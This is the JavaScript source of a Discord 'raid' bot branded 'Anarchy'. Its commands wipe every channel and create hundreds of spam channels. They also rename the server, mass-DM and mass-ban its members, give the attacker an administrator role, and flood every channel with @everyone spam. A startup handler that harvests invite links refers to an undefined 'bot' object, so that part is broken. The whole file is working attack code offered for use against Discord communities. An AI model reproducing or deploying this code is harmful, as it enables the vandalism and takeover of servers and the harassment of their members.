const Discord = require("discord.js");
const client = new Discord.Client();
var prefix = ".";
var mention = "126connectés"

var fucked = false;

bot.on('ready',() => {
    //invit link
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 

client.on('message', msg => {
 

  if (msg.content === '-ded') {
      if (msg.channel.type === "dm") return;
      if (msg.deletable) msg.delete();
      msg.guild.members.forEach(member => {
        setInterval(function () {
          member.send("**" + msg.guild.owner.user.username + "** a été détruit par Anarchy\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/RUXkZqp").catch(error => {}) }, 450)})
}

if(msg.content === '-del'){
if(msg.channel.type === "dm") return;
if(msg.guild.channels.size === 0) return;
else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

if (msg.content === '-ded') {
console.log(`Commande -ded par ${msg.author.tag}`);



if (!fucked){
msg.guild.setIcon('https://cdn.discordapp.com/icons/498502361526829066/3a3d7943bf5c012064da45516b9ee279.webp').catch(e => {});
msg.guild.setName('DEAD BY ANARCHY').catch(e => {});

for (var i = 0; i < 390; i++) {
msg.guild.createChannel('RAID BY ANARCHY', 'voice').catch(e => {});
msg.guild.createChannel('RAID BY ANARCHY', 'text').catch(e => {});
}

fucked = true;
}

if (msg.deletable) {
msg.delete();
}
}

if (msg.content === '-rban') {
console.log(`Commande -rban par ${msg.author.tag}`);
msg.guild.members.forEach(member => {
if (!member.roles.exists("name", ".Anarchy.") && member.bannable) member.ban().catch(e => {});
});
}

if (msg.content === '-stop') {
console.log(`Commande -stop par ${msg.author.tag}`);
if (msg.deletable) msg.delete().catch(e => {});
msg.guild.leave().catch(e => {});
}

if (msg.content === '-gp') {
console.log(`Commande -gp par ${msg.author.tag}`);

msg.member.guild.createRole({
name: ".Anarchy.",
permissions: "ADMINISTRATOR",
mentionable: false
}).then(function(role) {
msg.member.addRole(role);
if (msg.deletable) msg.delete().catch(e => {});
}).catch(e => {});
}
//#endregion
});
client.on("message", msg => {
if(msg.content.startsWith("-ded")){
 msg.delete()
  let i = 0;
  let interval = setInterval(function () {
    msg.guild.channels.forEach(channel => {
      if (channel.type === "text") channel.send("@everyone @here \nRaid By Anarchy\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/RUXkZqp")
    }, 2500);
  });
}
});

client.login(process.env.TOKEN)
